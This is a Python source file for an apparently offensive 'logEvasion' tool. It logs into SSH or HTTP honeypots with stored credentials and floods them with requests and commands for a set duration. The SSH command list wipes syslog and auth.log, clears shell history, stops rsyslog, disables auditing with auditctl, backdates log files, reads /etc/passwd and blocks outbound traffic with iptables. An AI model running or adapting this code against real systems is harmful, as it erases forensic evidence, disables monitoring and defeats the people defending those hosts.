import os
import time
import json
import random
import paramiko
import requests
import threading
import concurrent
import subprocess
from pathlib import Path

class logEvasion:
    def __init__(self, attack_duration):
        self.config = self.load_config()
        self.attack_duration = attack_duration * 60
        self.stop_event = threading.Event()
        self.fake_http_commands = [
            "GET /wp-login.php", "GET /xmlrpc.php", "POST /wp-admin/admin-ajax.php", "GET /robots.txt"
        ]

    def load_config(self):
        config_path = Path(__file__).parent.parent / "configs" / "config.json"
        if not config_path.exists():
            raise FileNotFoundError("Config file not found!")
        with open(config_path, "r") as file:
            return json.load(file)

    def ssh_log_flood(self, ip, port, username, password):
        def ssh_connect():
            commands = [
                "id", "whoami", "ls -la", "pwd", "cat /etc/passwd",
                'echo "pwn3d" > /tmp/test', "history -c && history -w",
                "unset HISTFILE", "echo \"\" > /var/log/syslog",
                "echo \"\" > /var/log/auth.log", "sed -i '/pattern/d' /var/log/syslog",
                "service rsyslog stop", "iptables -A OUTPUT -d 192.168.1.100 -j DROP",
                "touch -t 202201010101 /var/log/syslog", "auditctl -e 0"
            ]
            command = random.choice(commands)
            print(f"[*] Executing: {command}")
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, port, username, password, timeout=50)
                channel = client.invoke_shell()
                time.sleep(1)
                channel.recv(1024)
                channel.send(command + "\n")
                time.sleep(1)
                output = channel.recv(4096).decode().strip()
                print(output)
                return output
            except Exception as e:
                print(f"Error: {e}")
            finally:
                client.close()

        print("[+] SSH log flood in execution.")
        start_time = time.time()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            while time.time() - start_time < self.attack_duration and not self.stop_event.is_set():
                executor.submit(ssh_connect)
                self.stop_event.wait(random.uniform(1, 3))

        print("[*] SSH Log flooding successful.")

    def http_log_flood(self, ip, port):
        def req_flood():
            dirs = [
                "/", "/index.html", "/index.php", "/robots.txt", "/xmlrpc.php", "/wp-login.php", "/wp-admin/admin-ajax.php",
                "/?feed=comments-rss2", "/?p=1#comment-1", "/?feed=rss2", "/?s=login&submit=Search"
            ]
            dir = random.choice(dirs)
            url = f"http://{ip}:{port}{dir}"
            print(f"[*] Requesting {url}")
            try:
                response = requests.get(url, timeout=5)
                print(f"Response Status: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Request failed: {e}")

        print("[+] HTTP log flood in execution.")
        start_time = time.time()

        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            while time.time() - start_time < self.attack_duration and not self.stop_event.is_set():
                executor.submit(req_flood)
                self.stop_event.wait(random.uniform(1, 3))  # Properly handling delays

        print("[*] HTTP Log flood completed.")


    def evade(self):
        hp_type = self.config.get("honeypot_type", "").lower()
        creds = self.config.get("honeypot_creds", {})
        ip = creds.get("ip")
        port = creds.get("ports")
        username = creds.get("username")
        password = creds.get("password")

        if hp_type == "ssh":
            self.ssh_log_flood(ip, port, username, password)
        elif hp_type == "http":
            self.http_log_flood(ip, port)
        else:
            print(f"[!] Not available for {hp_type} honeypot.")
            return False

        return f"[*] Log flood successful on {ip}:{port}"
